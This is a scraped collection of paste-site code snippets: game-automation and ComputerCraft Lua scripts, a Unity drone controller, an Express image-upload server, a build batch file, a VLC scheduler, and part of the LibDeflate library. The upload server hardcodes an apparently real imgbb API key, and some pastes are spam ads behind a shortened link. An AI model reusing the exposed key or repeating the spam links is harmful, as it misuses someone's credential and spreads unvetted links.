	enMsg, p := encrypt(msg, big.NewInt(int64(q)), h, big.NewInt(int64(g)))
    drMsg := decrypt(enMsg, big.NewInt(int64(p)), big.NewInt(int64(key)), big.NewInt(int64(q)))
	fmt.Println(dr_msg)
}"
zGub5tJ0,Pet Simulator 99 Auto Fish,Killyoboy,Autohotkey,Friday 22nd of December 2023 12:05:47 PM CDT,"#MaxThreadsPerHotKey, 2
Toggle := 0

F1::
Toggle := !Toggle
MouseDown := False

While Toggle {
    PixelSearch, greyX, greyY, 1485, 255, 1512, 862, 0xE3CBC7, 5, fast ;;grey
    PixelSearch, greenX, greenY, 1485, 255, 1512, 862, 0x12F88B, 5, fast ;;green

    If (greenY or greyY) {
        If (!greenY) {
            MouseDown := !MouseDown
            
            if(MouseDown) {
                Send {Click down}
                x := 0
                green := False
                
                Loop {
                    Sleep, 50
                    PixelSearch, greenX, greenY, 1485, 255, 1512, 862, 0x12F88B, 5, fast ;;green
                    
                    if(greenY) {
                        green := True
                    }
                    
                    x += 1
                } Until (x >= 15 or green)

            } else {
                Send {Click up}
                
                x := 0
                green := False
                
                Loop {
                    Sleep, 50
                    PixelSearch, greenX, greenY, 1485, 255, 1512, 862, 0x12F88B, 5, fast ;;green
                    
                    if(greenY) {
                        green := True
                    }
                    x += 1
                } Until (x >= 15 or green)
            }
        } else {
	    ;MouseDown := !MouseDown
            
            green := True
            
            Loop {
                Send {Click down}
                Sleep, 100
                Send {Click up}
                Sleep, 50
                PixelSearch, greenX, greenY, 1485, 255, 1512, 862, 0x12F88B, 5, fast ;;green
                
                if(not greenY) {
                    green := False
                }
            } Until (not green)
        }
    } else {
        MouseDown := False
        Send {Click down}
        Sleep, 100
        Send {Click up}
        Sleep, 3000
        Send {Click down}
    }
}"
fkd4mq33,Untitled,sissou123,C#,Friday 22nd of December 2023 12:03:42 PM CDT,"Complete C# Unity Game Developer 2D
Learn Unity in C# & Code Your First Five 2D Video Games for Web, Mac & PC. The Tutorials Cover Tilemap 
for more:https://dz-linkk.com/Csl81
"
fAwySErf,geoscanner.lua,iconmaster,Lua,Friday 22nd of December 2023 11:55:00 AM CDT,"local completion = require ""cc.completion""
local scanner = peripheral.find(""geoScanner"")

local args = { ... }
if #args < 1 then
    printError(""error: needs 1 argument (radius)"")
    return
end
local radius = tonumber(args[1])
if not radius then
    printError(""error: invalid radius"")
    return
end

local cost, err = scanner.cost(radius)
if err then
    printError(""error: when calculating cost: "" .. err)
    return
end
print(""Cost: "" .. cost .. "" FE"")

local function possiblyRefuel(cost)
    local fuel = turtle.getFuelLevel();
    if fuel ~= ""unlimited"" then
        print(""Fuel: "" .. fuel .. "" FE"")
        if cost > fuel then
            print(""Energy deficit: "" .. (fuel - cost) .. "" FE"")
            write(""Refuel? [Yn] "")
            local choice = read()
            if choice == """" or choice == ""y"" or choice == ""Y"" then
                for i = 1, 16 do
                    turtle.select(i)
                    turtle.refuel()
                end
                print(""Turtle refueled."")
                return possiblyRefuel(cost)
            else
                printError(""error: not enough fuel"")
                return false
            end
        end
    end
    return true
end

if not possiblyRefuel(cost) then return end

if scanner.getScanCooldown and scanner.getScanCooldown() > 0 then
    print(""Waiting for scanner cooldown ("" .. scanner.getScanCooldown() .. ""s)..."")
    sleep(scanner.getScanCooldown() + 1)
end

print(""Scanning..."")
local scanResult, err = scanner.scan(radius)
if err then
    printError(""error: when scanning: "" .. err)
    return
end

print(""Scan complete. Analyzing..."")
local totals = {}
local sum = 0
for i, block in ipairs(scanResult) do
    if totals[block.name] then
        totals[block.name] = totals[block.name] + 1
    else
        totals[block.name] = 1
    end
    sum = sum + 1
end

print(""Scanned "" .. sum .. "" blocks. Results:"")
local TERM_ROWS = 13
local row = 0
for name, amount in pairs(totals) do
    print(""  "" .. name .. "": "" .. amount)
    row = row + 1
    if row >= TERM_ROWS - 2 then
        read()
        row = 0
        print(""Scanned "" .. sum .. "" blocks. Results:"")
    end
end

local function get_keys(t)
    local keys = {}
    for key, _ in pairs(t) do
        table.insert(keys, key)
    end
    return keys
end

local keys = get_keys(totals)
while true do
    write(""Get positions of block? "")
    local result = read(nil, nil, function(s) return completion.choice(s, keys) end)
    if result == """" then
        break
    end
    if not totals[result] then
        printError(""error: unknown block"")
    else
        local row = 0
        for i, block in ipairs(scanResult) do
            if block.name == result then
                print(""  "" .. i .. "": ("" .. block.x .. "", "" .. block.y .. "", "" .. block.z .. "")"")
                row = row + 1
                if row >= TERM_ROWS - 1 then
                    read()
                    row = 0
                end
            end
        end
    end
end
"
PznDkDfQ,Untitled,shawon_majid,TypeScript,Friday 22nd of December 2023 11:50:37 AM CDT,"import express from 'express';
import dotenv from 'dotenv';
import * as path from 'path';
import multer from 'multer';
import bodyParser from 'body-parser';
import axios from 'axios';
import FormData from 'form-data';


const baseImagePath =  path.join(__dirname, '../', 'images')

const ibbAPIkey = '6cbbe4f41c6a665ed39a66645f2c7bcb'

const profilePhotoPath = path.join(baseImagePath, 'user_profile_photos')
const storage = multer.memoryStorage()

const app = express();
const upload = multer({storage:storage })
dotenv.config();
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({extended: true}))
app.get('/', (req, res) => {
    res.send('<h1>Hello World</h1>');
});

const filePath = path.join(__dirname, '../', 'images', 'user_cover_photos')

app.get('/image', (req, res)=>{
    res.sendFile(path.join(filePath, 'shawon majid2.png'))
})

app.post('/upload', upload.single('image'), async (req, res) => {
  try {
    const form = new FormData();
    form.append('key', ibbAPIkey);
    form.append('image', req.file?.buffer, { filename: 'image.png' });

    const ibbResponse = await axios.post('https://api.imgbb.com/1/upload', form, {
      headers: form.getHeaders(),
    });

    console.log(ibbResponse.data.data.image.url);
    res.send('File uploaded successfully');
  } catch (error) {
    console.log(error)
    res.status(500).send('Failed to upload');
  }
});

app.listen(process.env.PORT, () => {
    console.log('Server is listening on port: ' + process.env.PORT + '...');
});
"
sE1GYpMw,Untitled,sissou123,Python,Friday 22nd of December 2023 11:48:24 AM CDT,"Learn Python & Ethical Hacking From Scratch
Write 20+ hacking programs to learn hacking & programming at the same time | No prior knowledge required 
for more:https://dz-linkk.com/xqd2VN
"
7Re8zX8t,Collapsible Collections,Jade-Everstone,HTML,Friday 22nd of December 2023 11:47:13 AM CDT,"<!--Collapsible Collections snippet

Example sections include Ribbons and Stamps

-->

<!-- /// TOGGLE /// -->
<p style=""text-align:center"">
    <a href=""#collect"" data-toggle=""collapse"" role=""button"" aria-expanded=""false"" aria-controls=""collect"">(click to see collections)</a>
</p>
<!-- /// END TOGGLE /// -->


<!-- /// COLLAPSE /// -->
<div class=""collapse"" id=""collect"">
<div class=""container my-3"" style=""max-width:1000px;text-align:center;"">
    
    
    <!--// Single Collection // -->
    <h2>Single Collection</h2>
    <div class=""bg-faded p-2 my-3 mx-auto d-flex flex-wrap justify-content-center"" style=""max-width:500px"">
        
        <!-- Ribbon examples -->
        
        <a href="" SOURCE ""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""m-2"">
        </a>
        
        
        <a href="" SOURCE "" class=""tooltipster"" data-placement=""top""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""d-block m-2"">
        </a>
        
        
        <a href="" SOURCE "" class=""tooltipster"" data-placement=""top""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""d-block m-2"">
        </a>
        
        
        <a href="" SOURCE "" class=""tooltipster"" data-placement=""top""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""d-block m-2"">
        </a>
        
        
        <a href="" SOURCE "" class=""tooltipster"" data-placement=""top""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""d-block m-2"">
        </a>
        
        
        <a href="" SOURCE "" class=""tooltipster"" data-placement=""top""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""d-block m-2"">
        </a>
        
        
        <a href="" SOURCE "" class=""tooltipster"" data-placement=""top""
            data-toggle=""tooltip""
            title=""TITLE - Description"">
                <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134873_IPbfyi3MrgLRhjL.png"" class=""d-block m-2"">
        </a>
        
    </div>
    <!--// End Single Collection // -->
    
    
    <!-- // Row Collections // -->
    <div class=""row my-3"">
        
        <!--collection 1-->
        <div class=""col-lg-6"">
            <h2>Row Collection 1</h2>
            <div class=""bg-faded p-2 my-3 mx-auto d-flex flex-wrap justify-content-center"">
                
                <!--Stamp Examples-->
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                
            </div>
        </div>
        
        
        <!--collection 1-->
        <div class=""col-lg-6"">
            <h2>Row Collection </h2>
            <div class=""bg-faded p-2 my-3 mx-auto d-flex flex-wrap justify-content-center"">
                
                <!--Stamp Examples-->
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                <a href="" SOURCE "" 
                    data-toggle=""tooltip""
                    title=""Credit and/or flavor text"">
                        <img src=""https://f2.toyhou.se/file/f2-toyhou-se/images/75134824_I6SqOw1AQUPxpaz.png"" 
                    class=""m-1"">
                </a>
                
                
            </div>
        </div>
        
    </div>
    <!-- // End Row Collectiosn // -->
    
    
</div>
</div>
<!-- /// END COLLAPSE /// -->"
TfVEf46w,Untitled,DugganSC,C#,Friday 22nd of December 2023 11:09:32 AM CDT,"using System;
using UnityEngine;
using Cinemachine;
using Game.Scripts.UI;

namespace Game.Scripts.LiveObjects
{
    public class Drone : MonoBehaviour
    {
        private enum Tilt
        {
            NoTilt, Forward, Back, Left, Right
        }

        [SerializeField]
        private Rigidbody _rigidbody;
        [SerializeField]
        private float _speed = 5f;
        private bool _inFlightMode = false;
        [SerializeField]
        private Animator _propAnim;
        [SerializeField]
        private CinemachineVirtualCamera _droneCam;
        [SerializeField]
        private InteractableZone _interactableZone;

        [SerializeField]
        private Game.Scripts.Player.Player _player;

        private PlayerInputs _playerInput;
        

        public static event Action OnEnterFlightMode;
        public static event Action OnExitFlightmode;

        private void OnEnable()
        {
            SetUpDroneInputs();
            InteractableZone.onZoneInteractionComplete += EnterFlightMode;
        }

        private void SetUpDroneInputs()
        {
            _playerInput = new PlayerInputs();
            _playerInput.Drone.Escape.performed += Escape_performed;
        }

        private void Escape_performed(UnityEngine.InputSystem.InputAction.CallbackContext obj)
        {
            ExitFlightMode();
        }

        private void EnterFlightMode(InteractableZone zone)
        {
            if (_inFlightMode != true && zone.GetZoneID() == 4) // drone Scene
            {
                _player.DisableWalkMode();
                _playerInput.Drone.Enable();
                _propAnim.SetTrigger(""StartProps"");
                _droneCam.Priority = 11;
                _inFlightMode = true;
                OnEnterFlightMode?.Invoke();
                UIManager.Instance.DroneView(true);
                _interactableZone.CompleteTask(4);
            }
        }

        private void ExitFlightMode()
        {            
            _droneCam.Priority = 9;
            _inFlightMode = false;
            UIManager.Instance.DroneView(false);
            _playerInput.Drone.Disable();
            _player.ActivateWalkMode();
        }

        private void Update()
        {
            if (_inFlightMode)
            {
                CalculateTilt();
                CalculateMovementUpdate();
            }
        }

        public void EscapeFlightMode()
        {
            _inFlightMode = false;
            OnExitFlightmode?.Invoke();
            ExitFlightMode();
        }

        private void FixedUpdate()
        {
            _rigidbody.AddForce(transform.up * (9.81f), ForceMode.Acceleration);
            if (_inFlightMode)
                CalculateMovementFixedUpdate();
        }

        private void CalculateMovementUpdate()
        {
            float rotation = _playerInput.Drone.Rotation.ReadValue<float>(); // goes from -1 to 1
            if (_playerInput.Drone.Rotation.IsPressed())
            {
                var tempRot = transform.localRotation.eulerAngles;
                tempRot.y += rotation * _speed / 3;
                transform.localRotation = Quaternion.Euler(tempRot);
            }
        }

        private void CalculateMovementFixedUpdate()
        {
            Vector3 movement = _playerInput.Drone.Move.ReadValue<Vector3>();
            if (Math.Abs(movement.y) > 0f)
            {
                _rigidbody.AddForce(movement.y * transform.up * _speed, ForceMode.Acceleration);
            }
        }

        private void CalculateTilt()
        {
            Vector3 movement = _playerInput.Drone.Move.ReadValue<Vector3>().normalized;
            if (movement.magnitude > 0f)
            {
                Debug.Log($""Calculate Tilt - Magnitude: {movement.magnitude} Value: {_playerInput.Drone.Move.ReadValue<Vector3>()}"");
                transform.rotation = Quaternion.Euler(30 * movement.x, transform.localRotation.eulerAngles.y, 30 * movement.z);
            }
        }

        private void OnDisable()
        {
            InteractableZone.onZoneInteractionComplete -= EnterFlightMode;
        }
    }
}
"
QPP5GQfb,MSYS2 Mingw64 Compiler Auxiliary,yy981,Winbatch,Friday 22nd of December 2023 11:07:15 AM CDT,"@echo off
chcp 65001>nul
title [%~n1]MSYS2-Mingw64_Compiler

setlocal enabledelayedexpansion
if ""%1""=="""" goto generate
set x=%~x1
set xo=0
if ""%x%""=="".c"" set xo=1
if ""%x%""=="".cpp"" set xo=1
if ""%x%""=="".ybp"" set xo=1
if %xo%==0 echo C(.c) もしくは C++(.cpp) もしくは Build_Profile(.ybp) ではありません&pause&exit /b
if ""%x%""=="".ybp"" goto ybp

set exename=%~n1
set original=nooption
set ""addlibrary= ""
set /p original=独自オプション:
set /p exename=実行ファイル名(拡張子除く):
set /p addlibrary=追加するライブラリ(各ファイル名の前に-lを追加):
set /p option=オプション:
goto noybp

:ybp
set line=0
for /f ""delims="" %%a in (%1) do (
set /a line=!line!+1
if !line!==1 set exename=%%a
if !line!==2 set addlibrary=%%a
if !line!==3 set option=%%a
if !line!==4 set original=%%a
)

if ""%addlibrary%""==""nul"" set ""addlibrary=""
if ""%option%""==""nul"" set ""option=""

:noybp

if not ""%addlibrary:qt=%""==""%addlibrary%"" set ""addlibrary=-lQt6Core -lQt6Widgets -lQt6Gui""
if ""%original:nocp932=%""==""%original%"" set ""cp932=-fexec-charset^=cp932""
if not ""%original:qt=%""==""%original%"" (
set ""addlibrary=-lQt6Core -lQt6Widgets -lQt6Gui""
c:\msys64\mingw64\share\qt6\bin\moc.exe %1 -o %~dp1_.moc
set mocfile=%~dp1_.moc
)

:loop

echo LOADING

echo CC  = g++>_.mk
echo CFLAGS  = %option%>>_.mk
echo TARGET  = %exename%.exe>>_.mk
echo SRCS    = %~n1.cpp %mocfile:\=/%>>_.mk
echo OBJS    = %~n1.o>>_.mk
echo INCDIR  = -Ic:/msys64/mingw64/include>>_.mk
echo LIBDIR  = -Lc:/msys64/mingw64/lib>>_.mk
echo LIBS    = %addlibrary%>>_.mk
echo $(TARGET): $(OBJS)>>_.mk
echo 	$(CC) -o $@ $^^ $(LIBDIR) $(LIBS)>>_.mk
echo %%.o: %%.cpp>>_.mk
echo 	$(CC)  %cp932% $(CFLAGS) $(INCDIR) -c $^< -o $@>>_.mk

set _=%~dp1
set _=%_:\=/%
set temp_=%temp:\=/%

cd %_:~0,-1%
c:\GnuWin32\bin\make.exe -B -f %_:~0,-1%/_.mk
del ""%~n1.o""
pause
for /l %%a in (1,1,10) do echo.
goto loop

:generate
echo ファイルを%0にドラッグ^&ドロップされなかったのでBuild_Profileを作成モードで起動します

set /p codename=ソースコードファイル名(拡張子除く):
set exename=%codename%
set addlibrary=nul
set option=nul
set /p exename=実行ファイル名(拡張子除く):
set /p addlibrary=追加するライブラリ(各ファイル名の前に-lを追加):
set /p option=追加オプション:
set /p original=独自オプション:
echo %exename%>%codename%.ybp
echo %addlibrary%>>%codename%.ybp
echo %option%>>%codename%.ybp
echo %original%>>%codename%.ybp
exit /b
"
Pnr9H2bA,LuaGame - System - Party,CaiusNelson,Lua,Friday 22nd of December 2023 10:48:30 AM CDT,"Party={}

function Party.SetMemberInParty(member,in_party)
	SaveData.party[member].in_party=true
end


--	FORMATION	--
function Party.SwampMemberFormationPosition(member_a,Member_b)
	local temp = SaveData.party[member_a]
    SaveData.party[member_a] = SaveData.party[Member_b]
    SaveData.party[Member_b] = temp
end"
W3saywvp,custom door panel,forestfire97,Lua,Friday 22nd of December 2023 10:37:20 AM CDT,"os.loadAPI(""API/funAPI.lua"")
local function DrawBorder(monitor,BARC,BORC)
    local mon = peripheral.wrap(monitor)
    if mon then
         local xSize,ySize = mon.getSize()
         local cursorPosX = 1
         local cursorPosY = 1
         local BORL = 1
        funAPI.monFun(monitor,cursorPosX,cursorPosY,BARC,BARC,1,"""",""clear all"")
        while BORL < xSize*ySize+1 do

            if cursorPosY == 1 or cursorPosY == ySize then
                print(""clearing line on: ""..monitor)
                funAPI.monFun(monitor,cursorPosX,cursorPosY,BORC,BORC,1,"""",""clear line"")
            end
            if cursorPosX == 1 or cursorPosX == xSize then
                print(""adding dot to side wall on: ""..monitor)
                funAPI.monFun(monitor,cursorPosX,cursorPosY,BORC,BORC,1,""1"","""")
            end

            if cursorPosX < xSize then
                print(""going over one on: ""..monitor)
                cursorPosX = cursorPosX+1
            else
                print(""going down a line on: ""..monitor)
                cursorPosX = 1
                cursorPosY = cursorPosY+1
            end
            BORL = BORL+1
        end
        else Error(""Unable to find "".. monitor .."" make sure it is connected to the network"")
    end
end

DrawBorder(""monitor_4"",colors.orange,colors.cyan)
DrawBorder(""monitor_5"",colors.orange,colors.cyan)


-- Initialize the monitors
local monitor4 = peripheral.wrap(""monitor_4"")
local monitor5 = peripheral.wrap(""monitor_5"")

-- Function to draw the number pad on a given monitor
local function drawNumberPad(monitor)
    -- Get the size of the monitor
    local width, height = monitor.getSize()
	funAPI.boxFun(""monitor_4"",3,2,width-4,2,colors.black,colors.green)
	funAPI.boxFun(""monitor_5"",3,2,width-4,2,colors.black,colors.green)
    -- Define padding and button dimensions
    local paddingX, paddingY = 3, 5
    local buttonWidth = (width - 2 * paddingX) / 3
    local buttonHeight = (height - paddingY) / 4

    -- Function to draw a number button
    local function drawButton(number, x, y)
        funAPI.boxFun(monitor, x, y, buttonWidth, buttonHeight, colors.gray, colors.white)
        funAPI.monFun(monitor, x + buttonWidth / 2, y + buttonHeight / 2, colors.gray, colors.white, 1, tostring(number), """")
    end

    -- Draw the number pad
    for i = 0, 9 do
        local x = paddingX + (i % 3) * buttonWidth
        local y = paddingY + math.floor(i / 3) * buttonHeight
        drawButton(i, x, y)
    end

    -- Draw the enter button
    local enterButtonX = paddingX
    local enterButtonY = paddingY + 3 * buttonHeight
    funAPI.boxFun(monitor, enterButtonX, enterButtonY, buttonWidth * 3, buttonHeight, colors.green, colors.white)
    funAPI.monFun(monitor, enterButtonX + buttonWidth * 1.5, enterButtonY + buttonHeight / 2, colors.green, colors.white, 1, ""Enter"", """")
end

-- Draw the number pad on both monitors
drawNumberPad(monitor4)
drawNumberPad(monitor5)

-- Main event loop
while true do
    local evt, id, clkX, clkY = os.pullEvent(""monitor_touch"")
    -- Handle button presses here
    -- You can distinguish between monitors by checking the 'id'
    if id == monitor4 then
        print (evt)
    end
end"
CU3q4BvE,MovieProjection,misiekii123,Python,Friday 22nd of December 2023 10:36:08 AM CDT,"import vlc
import time
import schedule
import threading
import os
import requests

# Adres IP i token Twojego urządzenia SmartThings
smartthings_ip = ""192.168.1.2""  # Zastąp własnym adresem IP
smartthings_token = ""YOUR_ACCESS_TOKEN""  # Zastąp własnym tokenem dostępu

def playMovie():
    # Przełącz źródło na Smart TV przed rozpoczęciem filmu
    switch_source(""your_tv_device_id"", ""your_tv_input_source_id"")

    instance = vlc.Instance()
    player = instance.media_player_new()
    media = instance.media_new(sciezka)
    player.set_media(media)
    player.set_fullscreen(True)

    # Rozpoczęcie odtwarzania
    player.play()

    # Oczekiwanie na zakończenie odtwarzania
    while not player.get_state() == vlc.State.Ended:
        time.sleep(1)

    # Twój kod do wykonania po zakończeniu odtwarzania
    print(""Film zakończony."")

    # Zatrzymaj odtwarzacz po zakończeniu filmu
    player.stop()

    # Przełącz źródło na Smart TV po zakończeniu filmu
    switch_source(""your_tv_device_id"", ""your_tv_default_source_id"")

def switch_source(device_id, source_id):
    url = f""http://{smartthings_ip}:39500/devices/{device_id}/commands""
    headers = {
        ""Authorization"": f""Bearer {smartthings_token}"",
        ""Content-Type"": ""application/json"",
    }
    payload = {
        ""commands"": [
            {
                ""capability"": ""switchLevel"",
                ""command"": ""setLevel"",
                ""arguments"": [source_id],
            }
        ]
    }
    response = requests.post(url, headers=headers, json=payload)
    if response.status_code == 200:
        print(""Źródło przełączone pomyślnie."")
    else:
        print(f""Błąd podczas przełączania źródła. Kod błędu: {response.status_code}"")

def schedule_play():
    print(f""Odtwarzanie filmu o godzinie: {time_to_start}"")
    schedule.every().day.at(time_to_start).do(playMovie)

print('''Wybierz opcję:
      1. 9.30
      2. 11.00
      3. Inne\n''')
x = int(input())

if x == 1:
    time_to_start = ""09:30""
    sciezka = input(""Podaj ścieżkę filmu: "")
    os.system(""cls"")
elif x == 2:
    time_to_start = ""11:00""
    sciezka = input(""Podaj ścieżkę filmu: "")
    os.system(""cls"")
else:
    time_to_start = input(""Podaj godzinę rozpoczęcia: "")
    sciezka = input(""Podaj ścieżkę filmu: "")
    os.system(""cls"")


# Zarejestruj zadanie w harmonogramie
schedule_play()

def run_schedule():
    while True:
        schedule.run_pending()
        time.sleep(1)

# Uruchom harmonogram w osobnym wątku
schedule_thread = threading.Thread(target=run_schedule)
schedule_thread.start()

# Czekaj na zakończenie wątku harmonogramu
schedule_thread.join()
"
BsBZKSkA,ws.lua,PoggersMcWoggerson,Lua,Friday 22nd of December 2023 10:35:35 AM CDT,"os.loadAPI(""surface.lua"")
local monitor = peripheral.find(""monitor"")
local x, y = monitor.getSize()
local surf = surface.create(x, y, "" "", colors.white, colors.black)
surf:drawText(3, 3, ""Hello, world!"")
surf:render(monitor)

-- local LibDeflate = require(""LibDeflate"")
-- print(LibDeflate:CompressDeflate(""eyo""))
-- print(LibDeflate:DecompressDeflate(LibDeflate:CompressDeflate(""eyo"")))

-- local ws, err = http.websocket(""ws://localhost:6969"")
-- if ws then
--     print(""Connected to ""..""ws://localhost:6969"")
--     ws.send(""Hello!"")
--     local event, url, message = os.pullEvent(""websocket_message"")
--     if url == ""ws://localhost:6969"" then
--         print(""Received message from "".. url.. "" with contents "".. message)
--     end
-- else
--     print(""Failed to connect: "".. err)
-- end
-- ws.close()
"
CF6Yt8ay,LibDeflate.lua,PoggersMcWoggerson,Lua,Friday 22nd of December 2023 10:34:30 AM CDT,"--[[--
LibDeflate 1.0.0-release <br>
Pure Lua compressor and decompressor with high compression ratio using
DEFLATE/zlib format.

@file LibDeflate.lua
@author Haoqian He (Github: SafeteeWoW; World of Warcraft: Safetyy-Illidan(US))
@copyright LibDeflate <2018> Haoqian He
@license GNU General Public License Version 3 or later

This library is implemented according to the following specifications. <br>
Report a bug if LibDeflate is not fully compliant with those specs. <br>
Both compressors and decompressors have been implemented in the library.<br>
1. RFC1950: DEFLATE Compressed Data Format Specification version 1.3 <br>
https://tools.ietf.org/html/rfc1951 <br>
2. RFC1951: ZLIB Compressed Data Format Specification version 3.3 <br>
https://tools.ietf.org/html/rfc1950 <br>

This library requires Lua 5.1/5.2/5.3 interpreter or LuaJIT v2.0+. <br>
This library does not have any dependencies. <br>
<br>
This file ""LibDeflate.lua"" is the only source file of
the library. <br>
Submit suggestions or report bugs to
https://github.com/safeteeWow/LibDeflate/issues
]]

--[[
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see https://www.gnu.org/licenses/.

Credits:
1. zlib, by Jean-loup Gailly (compression) and Mark Adler (decompression).
	http://www.zlib.net/
	Licensed under zlib License. http://www.zlib.net/zlib_license.html
	For the compression algorithm.
2. puff, by Mark Adler. https://github.com/madler/zlib/tree/master/contrib/puff
	Licensed under zlib License. http://www.zlib.net/zlib_license.html
	For the decompression algorithm.
3. LibCompress, by jjsheets and Galmok of European Stormrage (Horde)
	https://www.wowace.com/projects/libcompress
	Licensed under GPLv2.
	https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
	For the code to create customized codec.
4. WeakAuras2,
	https://github.com/WeakAuras/WeakAuras2
	Licensed under GPLv2.
	For the 6bit encoding and decoding.
]]

--[[
	Curseforge auto-packaging replacements:

	Project Date: @project-date-iso@
	Project Hash: @project-hash@
	Project Version: @project-version@
--]]

local LibDeflate

do
	-- Semantic version. all lowercase.
	-- Suffix can be alpha1, alpha2, beta1, beta2, rc1, rc2, etc.
	-- NOTE: Two version numbers needs to modify.
	-- 1. On the top of LibDeflate.lua
	-- 2. HERE
	local _VERSION = ""1.0.0-release""

	local _COPYRIGHT =
	""LibDeflate "".._VERSION
	.."" Copyright (C) 2018 Haoqian He.""
	.."" License GPLv3+: GNU GPL version 3 or later""

	-- Register in the World of Warcraft library ""LibStub"" if detected.
	if LibStub then
		local MAJOR, MINOR = ""LibDeflate"", -1
		-- When MAJOR is changed, I should name it as LibDeflate2
		local lib, minor = LibStub:GetLibrary(MAJOR, true)
		if lib and minor and minor >= MINOR then -- No need to update.
			return lib
		else -- Update or first time register
			LibDeflate = LibStub:NewLibrary(MAJOR, _VERSION)
			-- NOTE: It is important that new version has implemented
			-- all exported APIs and tables in the old version,
			-- so the old library is fully garbage collected,
			-- and we 100% ensure the backward compatibility.
		end
	else -- ""LibStub"" is not detected.
		LibDeflate = {}
	end

	LibDeflate._VERSION = _VERSION
	LibDeflate._COPYRIGHT = _COPYRIGHT
end

-- localize Lua api for faster access.
local assert = assert
local error = error
local pairs = pairs
local string_byte = string.byte
local string_char = string.char
local string_find = string.find
local string_gsub = string.gsub
local string_sub = string.sub
local table_concat = table.concat
local table_sort = table.sort
local tostring = tostring
local type = type

-- Converts i to 2^i, (0<=i<=32)
-- This is used to implement bit left shift and bit right shift.
-- ""x >> y"" in C:   ""(x-x%_pow2[y])/_pow2[y]"" in Lua
-- ""x << y"" in C:   ""x*_pow2[y]"" in Lua
local _pow2 = {}

-- Converts any byte to a character, (0<=byte<=255)
local _byte_to_char = {}

-- _reverseBitsTbl[len][val] stores the bit reverse of
-- the number with bit length ""len"" and value ""val""
-- For example, decimal number 6 with bits length 5 is binary 00110
-- It's reverse is binary 01100,
-- which is decimal 12 and 12 == _reverseBitsTbl[5][6]
-- 1<=len<=9, 0<=val<=2^len-1
-- The reason for 1<=len<=9 is that the max of min bitlen of huffman code
-- of a huffman alphabet is 9?
local _reverse_bits_tbl = {}

-- Convert a LZ77 length (3<=len<=258) to
-- a deflate literal/LZ77_length code (257<=code<=285)
local _length_to_deflate_code = {}

-- convert a LZ77 length (3<=len<=258) to
-- a deflate literal/LZ77_length code extra bits.
local _length_to_deflate_extra_bits = {}

-- Convert a LZ77 length (3<=len<=258) to
-- a deflate literal/LZ77_length code extra bit length.
local _length_to_deflate_extra_bitlen = {}

-- Convert a small LZ77 distance (1<=dist<=256) to a deflate code.
local _dist256_to_deflate_code = {}

-- Convert a small LZ77 distance (1<=dist<=256) to
-- a deflate distance code extra bits.
local _dist256_to_deflate_extra_bits = {}

-- Convert a small LZ77 distance (1<=dist<=256) to
-- a deflate distance code extra bit length.
local _dist256_to_deflate_extra_bitlen = {}

-- Convert a literal/LZ77_length deflate code to LZ77 base length
-- The key of the table is (code - 256), 257<=code<=285
local _literal_deflate_code_to_base_len = {
	3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31,
	35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258,
}

-- Convert a literal/LZ77_length deflate code to base LZ77 length extra bits
-- The key of the table is (code - 256), 257<=code<=285
local _literal_deflate_code_to_extra_bitlen = {
